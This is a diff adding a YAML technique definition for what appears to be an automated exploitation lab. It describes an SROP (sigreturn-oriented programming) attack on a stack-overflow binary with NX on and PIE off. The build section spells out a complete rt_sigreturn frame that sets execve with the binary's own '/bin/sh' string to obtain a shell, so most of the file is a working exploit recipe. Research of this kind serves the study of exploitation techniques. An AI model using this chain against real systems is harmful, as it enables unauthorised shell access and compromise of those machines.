@@ -1,0 +1,62 @@
+# Lab eval2 twin: the SROP pivot (announces NOTHING). The sigreturn
+# gadget (mov rax, 15; syscall) and the argument string live in the
+# binary, unannounced - the sym_addr facts answer.
+technique: srop_eval2
+author: Gregory Epp
+source: https://github.com/log0u7/lictor-lab
+
+rules:
+  - id: app_srop_eval2
+    head: [applicable, srop_eval2]
+    conditions:
+      - [fact, vuln, sof]
+      - [fact, nx, true]
+      - [fact, pie, false]
+      - [match, gadget, 0, sigreturn]
+      - [match, sym_addr, 0, "sh_cmd"]
+
+kb:
+  - id: srop_eval2_001
+    technique: srop_eval2
+    description: >
+      One return into the sigreturn gadget restores a fully crafted
+      context: rax=execve, rdi=the binary's own "/bin/sh" string,
+      rip=the syscall tail behind the gadget (sym+7). The frame rides
+      the NUL-tolerant channel whole.
+    chain: [sigreturn, execve_frame]
+    unlocks: [shell]
+    success_rate: 0.9
+
+mcts:
+  requires: []
+  provides: [shell]
+  terminal: true
+  success: 0.85
+
+priors: [10, 1]
+
+build:
+  technique: srop_eval2
+  # the rt_sigreturn frame, verified against the running twin:
+  # [rsp_at_syscall - 8] is the frame base; the uc prefix (5 zero
+  # qwords) is unread; gregs follow glibc's enum order (R8..R15, RDI,
+  # RSI, RBP, RBX, RDX, RAX, RCX, RSP, RIP, EFL, CSGSFS, ERR, TRAPNO,
+  # OLDMASK, CR2), then the fpregs pointer (0: the kernel takes no
+  # extended state) and the 8 reserved words. efl 0x202, csgsfs
+  # 0x33 (cs only). rip = the gadget's own syscall instruction
+  # (sym + 7): the restored rax=59 fires execve there.
+  layout:
+    - [padding, measured_offset]
+    - [qword, "gadget:sigreturn"]
+    - [chain,
+       "const:0", "const:0", "const:0", "const:0", "const:0",
+       "const:0", "const:0", "const:0", "const:0", "const:0",
+       "const:0", "const:0", "const:0",
+       "sym:sh_cmd", "const:0", "const:0", "const:0", "const:0",
+       "const:59", "const:0", "const:0",
+       "sym:sigreturn_gadget+7",
+       "const:514", "const:51",
+       "const:0", "const:0", "const:0", "const:0",
+       "const:0",
+       "const:0", "const:0", "const:0", "const:0", "const:0",
+       "const:0", "const:0", "const:0"]
